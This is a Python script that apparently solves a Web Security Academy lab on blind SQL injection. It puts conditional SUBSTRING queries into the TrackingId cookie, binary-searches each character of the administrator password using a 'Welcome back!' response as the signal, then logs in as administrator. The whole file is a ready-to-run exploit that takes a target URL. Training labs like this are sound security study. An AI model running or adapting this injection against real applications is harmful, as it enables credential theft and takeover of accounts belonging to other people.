# usage:
# python3 9.py \
# --u https://0aaa00a7037819be80f76c960063008a.web-security-academy.net

import http.client
import re
import string
from argparse import ArgumentParser
from typing import Optional

import requests

ALPHANUM = list(string.digits + string.ascii_lowercase)
http.client.HTTPConnection.debuglevel = 1


class Solution:
    def __init__(self, url: str) -> None:
        self.url = url.rstrip("/")
        self.s = None

    def login(self, username: str, password: str) -> requests.Response:
        self.s = requests.Session()
        login_url = f"{self.url}/login"
        r = self.s.get(login_url)
        csrf = re.findall(r"\"csrf\" value=\"([\w]+)\"", r.text)[0]
        r = self.s.post(
            login_url,
            data={
                "csrf": csrf,
                "username": username,
                "password": password,
            },
        )

        return r

    def search(self, i: int) -> Optional[str]:
        s = requests.Session()
        req = s.get(f"{self.url}/")
        cookies = s.cookies.get_dict()
        tracking_id = cookies["TrackingId"]

        l, r = 0, len(ALPHANUM) - 1
        while l <= r:
            m = (l + r) // 2

            cookies["TrackingId"] = (
                f"{tracking_id}' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {i}, 1) = '{ALPHANUM[m]}"
            )
            s = requests.Session()
            req = s.get(f"{self.url}/", cookies=cookies)
            if "Welcome back!" in req.text:
                return ALPHANUM[m]

            cookies["TrackingId"] = (
                f"{tracking_id}' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {i}, 1) < '{ALPHANUM[m]}"
            )
            s = requests.Session()
            req = s.get(f"{self.url}/", cookies=cookies)
            if "Welcome back!" in req.text:
                r = m - 1
            else:
                l = m + 1

        return

    def solve(self) -> None:
        password = []
        i = 1
        while True:
            ch = self.search(i)
            if not ch:
                break
            else:
                password.append(ch)
            i += 1

        password = "".join(password)
        print(f"Password found! -- {password}")
        self.login("administrator", password)


def main():
    parser = ArgumentParser()
    parser.add_argument("--u", "--url", dest="url")
    args = parser.parse_args()
    s = Solution(args.url)
    s.solve()


if __name__ == "__main__":
    main()
